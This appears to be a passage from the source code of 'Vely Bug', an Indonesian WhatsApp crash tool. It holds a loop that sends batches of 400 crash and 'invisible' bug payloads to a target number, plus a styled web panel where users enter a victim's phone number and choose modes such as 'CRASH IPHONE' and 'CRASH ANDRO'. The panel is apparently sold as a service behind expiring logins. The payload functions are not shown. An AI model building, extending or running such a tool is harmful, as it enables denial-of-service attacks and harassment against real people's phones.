          iosKontakNih(sock, target),
          crashIos(sock, target),
          uiIos(sock, target),
          iosNick(sock, target)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 Invis iPhone 
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 2000); // ⏳ jeda 2 detik antar kiriman
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade Xtordcv 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 5000); // ⏳ jeda 5 detik antar batch
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`❌ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 2000); // tetap pakai jeda antar kiriman
    }
  };
  sendNext();
}
// ==================== HTML TEMPLATE ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
      timeZone: "Asia/Jakarta",
      year: "2-digit",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit",
    })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Vely Bug</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600;800&family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">

  <style>
    :root {
      --bg:#0a0f1a;
      --card:#101628;
      --muted:#9aa4c7;
      --text:#e8ecff;
      --primary:#9b5cff;
      --secondary:#00d4ff;
      --accent:#6dd6ff;
    }

    * {box-sizing:border-box;margin:0;padding:0;}
    body {
      font-family:Poppins, sans-serif;
      min-height:100vh;
      display:flex;
      justify-content:center;
      align-items:center;
      background: radial-gradient(circle at 20% 20%, rgba(155,92,255,.2), transparent 30%),
                  radial-gradient(circle at 80% 10%, rgba(0,212,255,.2), transparent 25%),
                  radial-gradient(circle at 50% 90%, rgba(109,214,255,.15), transparent 30%),
                  var(--bg);
      padding:20px;
      overflow:hidden;
    }

    .card {
      background: rgba(255,255,255,.05);
      backdrop-filter: blur(12px);
      border: 1px solid rgba(255,255,255,.1);
      border-radius: 18px;
      padding: 22px 20px;
      width: 100%;
      max-width: 360px;
      text-align: center;
      box-shadow: 0 0 20px rgba(155,92,255,.3);
      animation: fadeIn 1s ease;
    }

    @keyframes fadeIn {
      from {opacity:0; transform:translateY(20px);}
      to {opacity:1; transform:translateY(0);}
    }

    .logo {
      width:70px;
      height:70px;
      margin:0 auto 14px;
      border-radius:50%;
      object-fit:cover;
      box-shadow:0 0 16px var(--primary),0 0 30px rgba(0,212,255,.4);
    }

    .title {
      font-size:22px;
      font-family:Orbitron, sans-serif;
      font-weight:800;
      color: var(--primary);
      margin-bottom:4px;
      text-shadow:0 0 10px rgba(155,92,255,.7);
    }

    .subtitle {
      font-size:12px;
      color: var(--muted);
      margin-bottom:20px;
    }

    input[type="text"] {
      width:100%;
      padding:12px;
      border-radius:10px;
      border:1px solid rgba(255,255,255,.15);
      background:rgba(7,10,20,.6);
      color:var(--text);
      font-size:13px;
      outline:none;
      text-align:center;
      margin-bottom:16px;
      transition:.3s;
    }

    input:focus {
      border-color:var(--secondary);
      box-shadow:0 0 6px var(--secondary);
    }

    .buttons-grid {
      display:grid;
      grid-template-columns:1fr 1fr;
      gap:10px;
      margin-bottom:16px;
    }

    .buttons-grid button {
      padding:12px;
      font-size:13px;
      font-weight:600;
      border:none;
      border-radius:10px;
      cursor:pointer;
      background: rgba(255,255,255,0.05);
      color: var(--text);
      border:1px solid rgba(255,255,255,.15);
      transition: all .3s ease;
    }

    .buttons-grid button:hover {
      box-shadow:0 0 12px var(--secondary);
      transform:translateY(-2px) scale(1.03);
    }

    .buttons-grid button.selected {
      background:linear-gradient(90deg, var(--primary), var(--secondary));
      color:white;
      box-shadow:0 0 12px var(--primary);
    }

    .execute-button {
      width:100%;
      padding:12px;
      font-size:14px;
      font-weight:600;
      border:none;
      border-radius:10px;
      cursor:pointer;
      background:linear-gradient(90deg, var(--primary), var(--secondary));
      color:white;
      margin-bottom:12px;
      box-shadow:0 0 10px rgba(155,92,255,.4);
      transition: all .3s ease;
    }

    .execute-button:disabled {
      opacity:.5;
      cursor:not-allowed;
    }

    .execute-button:hover:not(:disabled) {
      transform:translateY(-2px) scale(1.03);
      box-shadow:0 0 16px rgba(0,212,255,.6);
    }

    .footer-action-container {
      display:flex;
      flex-wrap:wrap;
      justify-content:center;
      align-items:center;
      gap:8px;
      margin-top:20px;
    }

    .footer-button {
      background: rgba(255,255,255,0.05);
      border:1px solid var(--primary);
      border-radius:8px;
      padding:8px 12px;
      font-size:14px;
      color: var(--primary);
      display:flex;
      align-items:center;
      gap:6px;
      transition: background .3s ease;
    }

    .footer-button:hover {
      background: rgba(155,92,255,.2);
    }

    .footer-button a {
      text-decoration:none;
      color: var(--primary);
      display:flex;
      align-items:center;
      gap:6px;
    }

    /* Popup Tengah */
    .popup {
      position: fixed;
      top:50%;
      left:50%;
      transform: translate(-50%, -50%) scale(0.8);
      background: #111;
      color: var(--secondary);
      padding:16px 22px;
      border-radius:12px;
      box-shadow:0 0 20px rgba(0,212,255,.7);
      font-weight:bold;
      display:none;
      z-index:9999;
      animation: zoomFade 2s ease forwards;
      text-align:center;
    }

    @keyframes zoomFade {
      0% { opacity:0; transform: translate(-50%, -50%) scale(0.8); }
      15% { opacity:1; transform: translate(-50%, -50%) scale(1); }
      85% { opacity:1; transform: translate(-50%, -50%) scale(1); }
      100% { opacity:0; transform: translate(-50%, -50%) scale(0.8); }
    }
  </style>
</head>
<body>
  <div class="card">
    <img src="https://telegra.ph/file/7b949a3325b762394c263.jpg" class="logo" alt="Logo">
    <div class="title">Vely Bug</div>
    <div class="subtitle">Choose mode & target number</div>

    <input type="text" placeholder="Please Input Target Number 628xx" />

    <div class="buttons-grid">
      <button class="mode-btn" data-mode="andros"><i class="fas fa-skull-crossbones"></i> CRASH ANDRO</button>
      <button class="mode-btn" data-mode="ios"><i class="fas fa-dumpster-fire"></i> CRASH IPHONE</button>
      <button class="mode-btn" data-mode="andros-delay"><i class="fas fa-skull-crossbones"></i> INVIS ANDRO</button>
      <button class="mode-btn" data-mode="invis-iphone"><i class="fas fa-dumpster-fire"></i> INVIS IPHONE</button>
    </div>

    <button class="execute-button" id="executeBtn" disabled><i class="fas fa-rocket"></i> Kirim Bug</button>


    <div class="footer-action-container">
      <div class="footer-button">
        <a href="https://t.me/gxyenn" target="_blank"><i class="fab fa-telegram"></i> Developer</a>
      </div>
      <div class="footer-button">
        <a href="/logout"><i class="fas fa-sign-out-alt"></i> Logout</a>
      </div>
    </div>
  </div>

  <div id="popup" class="popup">✅ Success Send Bug</div>

  <script>
    const inputField = document.querySelector('input[type="text"]');
    const modeButtons = document.querySelectorAll('.mode-btn');
    const executeBtn = document.getElementById('executeBtn');
    const popup = document.getElementById('popup');

    let selectedMode = null;

    function isValidNumber(number) {
      const pattern = /^62\\d{7,13}$/;
      return pattern.test(number);
    }

    modeButtons.forEach(button => {
      button.addEventListener('click', () => {
        modeButtons.forEach(btn => btn.classList.remove('selected'));
        button.classList.add('selected');
        selectedMode = button.getAttribute('data-mode');
        executeBtn.disabled = false;
      });
    });

    executeBtn.addEventListener('click', () => {
      const number = inputField.value.trim();
      if (!isValidNumber(number)) {
        alert("Nomor tidak valid. Harus dimulai dengan 62 dan total 10-15 digit.");
        return;
      }
      // Tampilkan pop up sukses
      popup.style.display = "block";
      setTimeout(() => { popup.style.display = "none"; }, 2000);

      // Arahkan ke link eksekusi
      window.location.href = '/execution?mode=' + selectedMode + '&target=' + number;
    });
  </script>
</body>
</html>`;
};



